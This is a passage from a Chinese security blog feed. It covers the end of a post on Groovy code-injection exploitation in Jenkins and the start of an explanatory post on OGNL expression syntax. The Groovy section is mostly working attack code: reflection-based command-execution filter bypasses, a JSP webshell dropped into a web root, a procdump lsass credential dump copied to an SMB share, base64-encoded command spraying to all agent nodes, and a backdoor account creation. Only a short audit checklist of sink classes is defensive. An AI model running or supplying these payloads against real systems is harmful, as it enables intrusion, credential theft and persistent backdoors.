class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.groovy脚本文件如之前。</p><h4 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h4><p>Groovy语言包含了一个模板引擎功能，可以生成各种类型的格式化文件，非常方便。模板引擎有下面几个，它们<br>都实现了Template接口。</p><ul><li>SimpleTemplateEngine：基本的模板</li><li>StreamingTemplateEngine：功能和 SimpleTemplateEngine相同，不过支持大于64k的模板</li><li>GStringTemplateEngine：将模板保存为可写的闭包，在流式场景中很有用</li><li>XmlTemplateEngine：输出XML文件的模板引擎</li><li>MarkupTemplateEngine：一个完整的、优化过的模板引擎，可以用于生成HTML等模板</li></ul><p>场景：</p><ul><li>整个模板可控</li><li>模板使用拼接的方式生成，内容部分可控</li></ul><h2 id="0x03-漏洞利用Tricks"><a href="#0x03-漏洞利用Tricks" class="headerlink" title="0x03 漏洞利用Tricks"></a>0x03 漏洞利用Tricks</h2><h3 id="利用反射机制和字符串拼接Bypass"><a href="#利用反射机制和字符串拼接Bypass" class="headerlink" title="利用反射机制和字符串拼接Bypass"></a>利用反射机制和字符串拼接Bypass</h3><p>直接的命令执行在前面已经说过几种形式了：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接命令执行</span></span><br><span class="line">Runtime.getRuntime().exec(<span class="string">"calc"</span>)</span><br><span class="line"><span class="string">"calc"</span>.execute()</span><br><span class="line"><span class="string">'calc'</span>.execute()</span><br><span class="line"><span class="string">"$&#123;"</span>calc<span class="string">".execute()&#125;"</span></span><br><span class="line"><span class="string">"$&#123;'calc'.execute()&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 回显型命令执行</span></span><br><span class="line">println <span class="string">"whoami"</span>.execute().text</span><br><span class="line">println <span class="string">'whoami'</span>.execute().text</span><br><span class="line">println <span class="string">"$&#123;"</span>whoami<span class="string">".execute().text&#125;"</span></span><br><span class="line">println <span class="string">"$&#123;'whoami'.execute().text&#125;"</span></span><br><span class="line"><span class="keyword">def</span> cmd = <span class="string">"whoami"</span>;</span><br><span class="line">println <span class="string">"$&#123;cmd.execute().text&#125;"</span>;</span><br></pre></td></tr></table></figure><p>在某些场景下，程序可能会过滤输入内容，此时可以通过反射机制以及字符串拼接的方式来绕过实现命令执行：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line">Class&lt;?&gt; rt = Class.forName("java.la" + "ng.Run" + "time");</span><br><span class="line">Method gr = rt.getMethod("getR" + "untime");</span><br><span class="line">Method ex = rt.getMethod("ex" + "ec", String.class);</span><br><span class="line">ex.invoke(gr.invoke(null), "ca" + "lc")</span><br></pre></td></tr></table></figure><h3 id="窃取环境变量信息"><a href="#窃取环境变量信息" class="headerlink" title="窃取环境变量信息"></a>窃取环境变量信息</h3><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> env = System.getenv()</span><br><span class="line">println <span class="string">"$&#123;env&#125;"</span></span><br></pre></td></tr></table></figure><p><img src="/2020/03/24/浅析Groovy代码注入漏洞/8.png" alt=""></p><h3 id="枚举文件和文件夹"><a href="#枚举文件和文件夹" class="headerlink" title="枚举文件和文件夹"></a>枚举文件和文件夹</h3><p>枚举指定目录下的文件及文件夹：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dir = <span class="keyword">new</span> File(<span class="string">"E:\\wamp64\\www"</span>)</span><br><span class="line">dir.eachFile &#123;</span><br><span class="line">    println it</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/24/浅析Groovy代码注入漏洞/9.png" alt=""></p><p>枚举Windows下所有用户：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dir = <span class="keyword">new</span> File(<span class="string">"C:\\users"</span>)</span><br><span class="line">dir.eachFile &#123;</span><br><span class="line">    println it</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="操作文件"><a href="#操作文件" class="headerlink" title="操作文件"></a>操作文件</h3><p><strong>删除文件：</strong></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deleteme = <span class="keyword">new</span> File(<span class="string">'C:\\Users\\1.txt'</span>)</span><br><span class="line">deleteme.delete()</span><br></pre></td></tr></table></figure><p><strong>新建文件：</strong></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">createme = <span class="keyword">new</span> File(<span class="string">'E:\\wamp64\\www\\webshell.jsp'</span>)</span><br><span class="line">createme.createNewFile()</span><br></pre></td></tr></table></figure><p>创建一个空文件好像没啥用，但是可在渗透测试中用于检查用户在Jenkins的Web根目录下是否有可写的权限。</p><p><strong>读取文件：</strong></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String fileContents = <span class="keyword">new</span> File(<span class="string">'E:\\wamp64\\www\\flag.txt'</span>).text</span><br><span class="line">println(fileContents)</span><br></pre></td></tr></table></figure><p><strong>复制和移动文件：</strong></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">File src = <span class="keyword">new</span> File(<span class="string">"E:\\passwd"</span>)</span><br><span class="line">File dest = <span class="keyword">new</span> File(<span class="string">"E:\\passwd.txt"</span>)</span><br><span class="line">dest &lt;&lt; src.bytes</span><br></pre></td></tr></table></figure><p><strong>写入文件：</strong></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> File(<span class="string">'E:\\wamp64\\www'</span>,<span class="string">'webshell.jsp'</span>).withWriter(<span class="string">'utf-8'</span>) &#123;</span><br><span class="line">    writer -&gt;writer.writeLine <span class="string">'&lt;%Runtime.getRuntime().exec(request.getParameter("i"));%&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="加载共享盘"><a href="#加载共享盘" class="headerlink" title="加载共享盘"></a>加载共享盘</h3><blockquote><p>在一个攻陷主机加载一个远程共享盘可能没什么大问题，但是看一下做这件事的动机就知道这很重要。</p><p>我们来假设通过bat脚本从文件系统下载资源：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net use P: \\192.168.1.42\ShareName /user:MACHINE\user MountPassword</span><br><span class="line">cd &quot;C:\stack&quot;</span><br><span class="line">set HOME=%USERPROFILE%</span><br><span class="line">echo %date% %time%</span><br><span class="line">&quot;P:\Internal_Tools\Portable Software Stack\Git\bin\git.exe&quot; clean –f</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><blockquote><p>这种情况下192.168.1.42是一个和受攻击的Groovy主机同一个子网下的共享服务器，bat脚本中发现用了SMB共享的凭据信息，也就是说可以在Groovy脚本中运行“net use P:\192.168.1.43\Sharename /user:MACHINE\user MountPassword”这个命令，攻击者可以加载网络文件夹到本地磁盘下。</p><p>希望如果这样获得的凭据提供对远程共享中的一个或多个子文件夹的写访问权限，则攻击者可以将该共享用作临时服务器，其中存储命令输出或后门以从受感染的主机运行。 这将使攻击者处于更好的状态，在不触发防御警告的情况下传输自己想要用的工具。</p></blockquote><h3 id="执行procdump"><a href="#执行procdump" class="headerlink" title="执行procdump"></a>执行procdump</h3><blockquote><p>Windows下一个特殊的场景包括了执行procdump工具来下载“lsass.exe”进程的内存记录以拿到NTML哈希或明文密码。</p><p>这个操作可以通过如下一行代码执行：</p></blockquote><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println <span class="string">"C:\\users\\username\\jenkins-monitor.exe -accepteula -64 -ma lsass.exe C:\\users\\username\\lsass.dmp"</span>.execute().text</span><br></pre></td></tr></table></figure><blockquote><p>procdump二进制文件以”C:\users\username\jenkins-monitor.exe”的文件名来执行，输出保存在文件“C:\users\username\lsass.dmp”中。</p><p>现在“lsass.dmp”可以从jenkins本地通过Groovy代码传到共享盘了：</p></blockquote><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">src = <span class="keyword">new</span> File(<span class="string">"C:\\users\\username\\lsass.dmp"</span>)</span><br><span class="line">dist = <span class="keyword">new</span> File(<span class="string">"P:\\tmp\\lsass.dmp"</span>)</span><br><span class="line">dist &lt;&lt; src.bytes</span><br></pre></td></tr></table></figure><blockquote><p>然后攻击者可以分析它以拿到hash和凭据来在目标网络内做更多的控制操作。</p></blockquote><h3 id="散布（spray）技术"><a href="#散布（spray）技术" class="headerlink" title="散布（spray）技术"></a>散布（spray）技术</h3><blockquote><p>当一个Jenkins主节点被攻陷，所有连接它的从节点就会因为如下代码（使用了RemoteDiagnostics）就会被强制执行命令：</p></blockquote><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hudson.util.RemotingDiagnostics;</span><br><span class="line"><span class="keyword">def</span> jenkins = Jenkins.instance</span><br><span class="line"><span class="keyword">def</span> computers = jenkins.computers</span><br><span class="line">command = <span class="string">'println "whoami".execute().text'</span></span><br><span class="line">computers.each&#123;</span><br><span class="line"> <span class="keyword">if</span> (it.hostName)&#123;</span><br><span class="line"> println RemotingDiagnostics.executeGroovy(command,</span><br><span class="line">it.getChannel());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在这个案例中“whoami”命令会在网络中连接的Jenkins代理中被大量执行。</p></blockquote><h3 id="基于Base64编码的散布技术"><a href="#基于Base64编码的散布技术" class="headerlink" title="基于Base64编码的散布技术"></a>基于Base64编码的散布技术</h3><blockquote><p>更有趣的是，Groovy脚本可以不止发送单行代码给从服务器进行执行。为了不被发现，脚本编码了Groovy代码然后发送给了从服务器进行执行：</p></blockquote><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hudson.util.RemotingDiagnostics;</span><br><span class="line"><span class="keyword">def</span> jenkins = Jenkins.instance</span><br><span class="line"><span class="keyword">def</span> computers = jenkins.computers</span><br><span class="line"><span class="keyword">def</span> command =</span><br><span class="line"><span class="string">'ZGlyID0gbmV3IEZpbGUoJ2M6XFwnKQpkaXIuZWFjaEZpbGUgewoJcHJpbnRsbiBpdAp9</span></span><br><span class="line"><span class="string">Cg=='</span></span><br><span class="line"><span class="keyword">byte</span>[] decoded = command.decodeBase64()</span><br><span class="line">payload = <span class="keyword">new</span> String(decoded)</span><br><span class="line">computers.each&#123;</span><br><span class="line"> <span class="keyword">if</span> (it.hostName)&#123;</span><br><span class="line">println RemotingDiagnostics.executeGroovy(payload,</span><br><span class="line">it.getChannel());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>上面的代码中““ZGlyID0gbmV3IEZpbGUoJ2M6XFwnKQpkaXIuZWFjaEZpbGUgewoJcHJpbnRsbiBpdAp9Cg==”经过base64解码后就是在从服务器的C:\中列文件和文件夹的代码命令：</p></blockquote><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dir = <span class="keyword">new</span> File(<span class="string">'c:\\'</span>)</span><br><span class="line">dir.eachFile &#123;</span><br><span class="line">println it</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里关键的就是Groovy脚本可以嵌套另一个进行base64编码后的Groovy脚本。这是复制并粘贴到Jenkins Groovy控制台中的主要脚本。</p><p>散布技术是很有帮助的，例如一个攻击者想要一个一次性后门（所有从主机都可以被主服务器上的后门控制）。</p></blockquote><h3 id="建立账号后门"><a href="#建立账号后门" class="headerlink" title="建立账号后门"></a>建立账号后门</h3><blockquote><p>当访问Groovydeconsole口因为未授权原因被拒绝的话，如下脚本可以允许一个恶意代理创建账号，只要将如下代码中的“USERNAME”和”PASSWORD”字符串为自己的字符就可以了。</p></blockquote><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jenkins.model.*</span><br><span class="line"><span class="keyword">import</span> hudson.security.*</span><br><span class="line"><span class="keyword">def</span> instance = Jenkins.getInstance()</span><br><span class="line"><span class="keyword">def</span> hudsonRealm = <span class="keyword">new</span> HudsonPrivateSecurityRealm(<span class="literal">false</span>)</span><br><span class="line">hudsonRealm.createAccount(<span class="string">"USERNAME"</span>,<span class="string">"PASSWORD"</span>)</span><br><span class="line">instance.setSecurityRealm(hudsonRealm)</span><br><span class="line">instance.save()</span><br></pre></td></tr></table></figure><blockquote><p>我们发现通过这种方式添加用户，在图形化界面是看不到这个用户存在的，但是还是可以正常登陆Jenkins的console口。</p></blockquote><h2 id="0x04-排查方法"><a href="#0x04-排查方法" class="headerlink" title="0x04 排查方法"></a>0x04 排查方法</h2><p>排查关键类函数特征：</p><table><thead><tr><th>关键类</th><th>关键函数</th></tr></thead><tbody><tr><td>groovy.lang.GroovyShell</td><td>evaluate</td></tr><tr><td>groovy.util.GroovyScriptEngine</td><td>run</td></tr><tr><td>groovy.lang.GroovyClassLoader</td><td>parseClass</td></tr><tr><td>javax.script.ScriptEngine</td><td>eval</td></tr></tbody></table><p>除此之外，还需要关注几个模板的调用：</p><ul><li>SimpleTemplateEngine</li><li>StreamingTemplateEngine</li><li>GStringTemplateEngine</li><li>XmlTemplateEngine</li><li>MarkupTemplateEngine</li></ul><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://xz.aliyun.com/t/6372" target="_blank" rel="noopener">Jenkins groovy scripts for read teamers and penetration testers</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Groovy注入" scheme="https://www.mi1k7ea.com/tags/Groovy%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>OGNL表达式注入漏洞总结</title>
    <link href="https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/03/16/OGNL表达式注入漏洞总结/</id>
    <published>2020-03-16T13:51:15.000Z</published>
    <updated>2020-03-22T14:23:23.818Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-OGNL表达式基础"><a href="#0x01-OGNL表达式基础" class="headerlink" title="0x01 OGNL表达式基础"></a>0x01 OGNL表达式基础</h2><h3 id="OGNL简介"><a href="#OGNL简介" class="headerlink" title="OGNL简介"></a>OGNL简介</h3><p>OGNL全称Object-Graph Navigation Language即对象导航图语言，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。这样可以更好的取得数据。</p><p>OGNL使用<strong>Java反射</strong>和<strong>内省</strong>来解决运行时应用程序的对象图。这允许程序根据对象图的状态改变行为，而不是依赖于编译时设置。它还允许更改对象图。</p><p>简单了解下Java内省机制：</p><blockquote><p>Java语言内省（Introspector）是Java语言对Bean类属性、事件的一种缺省处理方法。例如类A中有属性name,那我们可以通过getName,setName来得到其值或者设置新的值。通过getName/setName来访问name属性，这就是默认的规则。Java中提供了一套API用来访问某个属性的getter/setter方法，通过这些API可以使你不需要了解这个规则（但你最好还是要搞清楚），这些API存放于包java.beans中。</p><p>一般的做法是通过类Introspector来获取某个对象的BeanInfo信息，然后通过BeanInfo来获取属性的描述器（PropertyDescriptor），通过这个属性描述器就可以获取某个属性对应的getter/setter方法，然后我们就可以通过反射机制来调用这些方法。</p></blockquote><p>OGNL可以让我们用非常简单的表达式访问对象层，例如，当前环境的根对象为user1，则表达式person.address[0].province可以访问到user1的person属性的第一个address的province属性。</p><p>webwork2和现在的Struts2.x中使用OGNL取代原来的EL来做界面数据绑定，所谓界面数据绑定，也就是把界面元素（例如一个textfield,hidden)和对象层某个类的某个属性绑定在一起，修改和显示自动同步。而Struts2框架正是因为滥用OGNL表达式，使之成为了“漏洞之王”。</p><p>OGNL表达式具有以下特点：</p><ul><li>支持对象方法调用，如<code>objName.methodName()</code>；</li><li>支持类静态方法调用和值访问，表达式的格式为<code>@[类全名（包括包路径）]@[方法名|值名]</code>，如@java.lang.String@format(‘fruit%s’,’frt’)；</li><li>支持赋值操作和表达式串联，如price=100、discount=0.8，calculatePrice(price*discount)这个表达式会返回80；</li><li>访问OGNL上下文（OGNL context）和ActionContext；</li><li>操作集合对象；</li><li>可以直接new一个对象；</li></ul><h3 id="OGNL三要素"><a href="#OGNL三要素" class="headerlink" title="OGNL三要素"></a>OGNL三要素</h3><p>OGNL具有三要素：表达式（expression）、根对象（root）和上下文对象（context）。</p><ul><li>表达式（expression）：表达式是整个OGNL的核心，通过表达式来告诉OGNL需要执行什么操作；</li><li>根对象（root）：root可以理解为OGNL的操作对象，OGNL可以对root进行取值或写值等操作，表达式规定了“做什么”，而根对象则规定了“对谁操作”。实际上根对象所在的环境就是 OGNL 的上下文对象环境；</li><li>上下文对象（context）：context可以理解为对象运行的上下文环境，context以MAP的结构、利用键值对关系来描述对象中的属性以及值；</li></ul><p>这样不难知道，OGNL的context是包含root的。</p><p>Struts2中的ActionContext即为OGNL的context（又称context map），其中包含的ValueStack即为OGNL的root。该ActionContext包含的对象如图：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/1.png" alt=""></p><h3 id="ActionContext"><a href="#ActionContext" class="headerlink" title="ActionContext"></a>ActionContext</h3><p>ActionContext是上下文对象，对应OGNL的context，是一个以MAP为结构、利用键值对关系来描述对象中的属性以及值的对象，简单来说可以理解为一个action的小型数据库，整个action生命周期（线程）中所使用的数据都在这个ActionContext中。</p><p>借网上的一个图看下ActionContext中包含哪些东西：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/2.png" alt=""></p><p>除了三个常见的作用域<code>request</code>、<code>session</code>、<code>application</code>外，还有以下三个作用域：</p><ul><li>attr：保存着上面三个作用域的所有属性，如果有重复的则以request域中的属性为基准；</li><li>paramters：保存的是表单提交的参数；</li><li>VALUE_STACK：值栈，保存着valueStack对象，也就是说可以通过ActionContext访问到valueStack中的值；</li></ul><h3 id="ValueStack"><a href="#ValueStack" class="headerlink" title="ValueStack"></a>ValueStack</h3><p>值栈（ValueStack）就是OGNL表达式存取数据的地方。在一个值栈中，封装了一次请求所需要的所有数据。</p><p>在使用Struts2的项目中，Struts2会为每个请求创建一个新的值栈，也就是说，值栈和请求是一一对应的关系，这种一一对应的关系使值栈能够线程安全地为每个请求提供公共的数据存取服务。</p><h4 id="值栈的作用"><a href="#值栈的作用" class="headerlink" title="值栈的作用"></a>值栈的作用</h4><p>值栈可以作为一个数据中转站在前台与后台之间传递数据，最常见的就是将Struts2的标签与OGNL表达式结合使用。值栈实际上是一个接口，在Struts2中利用OGNL时，实际上使用的就是实现了该接口的OgnlValueStack类，这个类是OGNL的基础。</p><p>值栈贯穿整个Action的生命周期，每个Action类的对象实例都拥有一个ValueStack对象，在ValueStack对象中保存了当前Action对象和其他相关对象。</p><p>要获取值栈中存储的数据，首先应该获取值栈。值栈的获取有两种方式，具体如下。</p><h4 id="在request中获取值栈"><a href="#在request中获取值栈" class="headerlink" title="在request中获取值栈"></a>在request中获取值栈</h4><p>ValueStack对象在request范围内的存储方式为<code>request.setAttribute(&quot;struts.valueStack&quot;,valuestack)</code>，可以通过如下方式从request中取出值栈的信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取 ValueStack 对象，通过 request 对象获取</span></span><br><span class="line">ValueStack valueStack = (ValueStack)ServletActionContext.getRequest()</span><br><span class="line">            .getAttribute(ServletActionContext.STRUTS_VALUESTACK_KEY);</span><br></pre></td></tr></table></figure><p>在上述示例代码中，ServletActionContext.STRUTS_VALUESTACK_KEY是ServletActionContext类中的常量，它的值为struts.valueStack。</p><h4 id="在ActionContext中获取值栈"><a href="#在ActionContext中获取值栈" class="headerlink" title="在ActionContext中获取值栈"></a>在ActionContext中获取值栈</h4><p>在使用Struts2框架时，可以使用OGNL操作Context对象从ValueStack中存取数据，也就是说，可以从Context对象中获取ValueStack对象。实际上，Struts2框架中的Context对象就是ActionContext。</p><p>ActionContext获取ValueStack对象的方式如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过 ActionContext 获取 valueStack 对象</span></span><br><span class="line">ValueStack valueStack = ActionContext.getContext().getValueStack();</span><br></pre></td></tr></table></figure><p>ActionContext对象是在StrutsPrepareAndExcuteFilter的doFilter()方法中被创建的，在源码中用于创建ActionContext对象的createActionContext()方法内可以找到获取的ValueStack对象的信息。</p><p>方法中还有这样一段代码：  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx = <span class="keyword">new</span> ActionContext(stack.getContext());</span><br></pre></td></tr></table></figure><p>从上述代码中可以看出，ValueStack对象中的Context对象被作为参数传递给了ActionContext对象，这也就说明ActionContext对象中持有了ValueStack对象的引用，因此可以通过ActionContext对象获取ValueStack对象。</p><h3 id="OGNL基本语法"><a href="#OGNL基本语法" class="headerlink" title="OGNL基本语法"></a>OGNL基本语法</h3><p>OGNL支持各种纷繁复杂的表达式。但是最最基本的表达式的原型，是将对象的引用值用点串联起来，从左到右，每一次表达式计算返回的结果成为当前对象，后面部分接着在当前对象上进行计算，一直到全部表达式计算完成，返回最后得到的对象。OGNL则针对这条基本原则进行不断的扩充，从而使之支持对象树、数组、容器的访问，甚至是类似SQL中的投影选择等操作。</p><h4 id="基本对象树的访问"><a href="#基本对象树的访问" class="headerlink" title="基本对象树的访问"></a>基本对象树的访问</h4><p>对象树的访问就是通过使用点号将对象的引用串联起来进行。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxxx</span><br><span class="line">xxxx.xxxx</span><br><span class="line">xxxx.xxxx.xxxx.xxxx.xxxx</span><br></pre></td></tr></table></figure><h4 id="对容器变量的访问"><a href="#对容器变量的访问" class="headerlink" title="对容器变量的访问"></a>对容器变量的访问</h4><p>对容器变量的访问，通过#符号加上表达式进行。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#xxxx</span><br><span class="line">#xxxx.xxxx</span><br><span class="line">#xxxx.xxxxx.xxxx.xxxx.xxxx</span><br></pre></td></tr></table></figure><h4 id="使用操作符号"><a href="#使用操作符号" class="headerlink" title="使用操作符号"></a>使用操作符号</h4><p>OGNL表达式中能使用的操作符基本跟Java里的操作符一样，除了能使用<code>+, -, *, /, ++, --, ==, !=, =</code>等操作符之外，还能使用<code>mod, in, not in</code>等。</p><h4 id="容器、数组、对象"><a href="#容器、数组、对象" class="headerlink" title="容器、数组、对象"></a>容器、数组、对象</h4><p>OGNL支持对数组和ArrayList等容器的顺序访问。例如：<code>group.users[0]</code></p><p>同时，OGNL支持对Map的按键值查找。例如：<code>#session[&#39;mySessionPropKey&#39;]</code></p><p>不仅如此，OGNL还支持容器的构造的表达式。例如：<code>{&quot;green&quot;, &quot;red&quot;, &quot;blue&quot;}</code>构造一个List，<code>#{&quot;key1&quot; : &quot;value1&quot;, &quot;key2&quot; : &quot;value2&quot;, &quot;key3&quot; : &quot;value3&quot;}</code>构造一个Map</p><p>你也可以通过任意类对象的构造函数进行对象新建。例如：<code>new Java.net.URL(&quot;xxxxxx/&quot;)</code></p><h4 id="对静态方法或变量的访问"><a href="#对静态方法或变量的访问" class="headerlink" title="对静态方法或变量的访问"></a>对静态方法或变量的访问</h4><p>要引用类的静态方法和字段，他们的表达方式是一样的<code>@class@member</code>或者<code>@class@method(args)</code>。</p><p>例如：@com.javaeye.core.Resource@ENABLE，@com.javaeye.core.Resource@getAllResources</p><h4 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h4><p>直接通过类似Java的方法调用方式进行，你甚至可以传递参数。</p><p>例如：<code>user.getName()</code>，<code>group.users.size()</code>，<code>group.containsUser(#requestUser)</code></p><h4 id="投影和选择"><a href="#投影和选择" class="headerlink" title="投影和选择"></a>投影和选择</h4><p>OGNL支持类似数据库中的投影（projection） 和选择（selection）。</p><p>投影就是选出集合中每个元素的相同属性组成新的集合，类似于关系数据库的字段操作。投影操作语法为 <code>collection.{XXX}</code>，其中XXX是这个集合中每个元素的公共属性。</p><p>例如：<code>group.userList.{username}</code>将获得某个group中的所有user的name的列表。</p><p>选择就是过滤满足selection条件的集合元素，类似于关系数据库的纪录操作。选择操作的语法为：<code>collection.{X YYY}</code>，其中X是一个选择操作符，后面则是选择用的逻辑表达式。而选择操作符有三种：</p><ul><li><code>?</code>选择满足条件的所有元素</li><li><code>^</code>选择满足条件的第一个元素</li><li><code>$</code>选择满足条件的最后一个元素</li></ul><p>例如：<code>group.userList.{? #txxx.xxx != null}</code>将获得某个group中user的name不为空的user的列表。</p><h3 id="OGNL语法树"><a href="#OGNL语法树" class="headerlink" title="OGNL语法树"></a>OGNL语法树</h3><p>OGNL语法树有两种形式：</p><ul><li>(expression)(constant) = value</li><li>(constant)((expression1)(expression2))</li></ul><p>每个括号对应语法树上的一个分支，并且从最右边的叶子节点开始解析执行。</p><h3 id="关于”-”符号"><a href="#关于”-”符号" class="headerlink" title="关于”.”符号"></a>关于”.”符号</h3><p>所有的OGNL表达式都基于当前对象的上下文来完成求值运算，链的前面部分的结果将作为后面求值的上下文。</p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name.toCharArray()[0].numbericValue.toString()</span><br></pre></td></tr></table></figure><ul><li>提取根(root)对象的name属性</li><li>调用上一步返回的结果字符串的toCharArray()方法</li><li>提取返回结果数组的第一个字符</li><li>获取字符的numbericValue属性，该字符是一个Character对象，Character类有个getNumeericValue()方法</li><li>调用结果Integer对象的toString()方法</li></ul><h3 id="和-和-的区别"><a href="#和-和-的区别" class="headerlink" title="# 和 % 和 $ 的区别"></a># 和 % 和 $ 的区别</h3><h4 id="符"><a href="#符" class="headerlink" title="#符"></a>#符</h4><p><code>#</code>符主要有三种用途：</p><ul><li>访问非根对象属性，即访问OGNL上下文和Action上下文，由于Struts2中值栈被视为根对象，所以访问其他非根对象时需要加#前缀，#相当于<code>ActionContext.getContext()</code>；</li><li>用于过滤和投影（projecting）集合，如<code>books.{? #this.price&lt;100}</code>；</li><li>用于构造Map，如<code>#{&#39;foo1&#39;:&#39;bar1&#39;, &#39;foo2&#39;:&#39;bar2&#39;}</code>；</li></ul><h4 id="符-1"><a href="#符-1" class="headerlink" title="%符"></a>%符</h4><p><code>%</code>符的用途是在标志的属性为字符串类型时，告诉执行环境%{}里的是OGNL表达式并计算表达式的值。</p><h4 id="符-2"><a href="#符-2" class="headerlink" title="$符"></a>$符</h4><p><code>$</code>符的主要作用是在相关配置文件中引入OGNL表达式，让其在配置文件中也能解析OGNL表达式。（换句话说，$用于在配置文件中获取ValueStack的值用的）。</p><h3 id="和-和-的区别-1"><a href="#和-和-的区别-1" 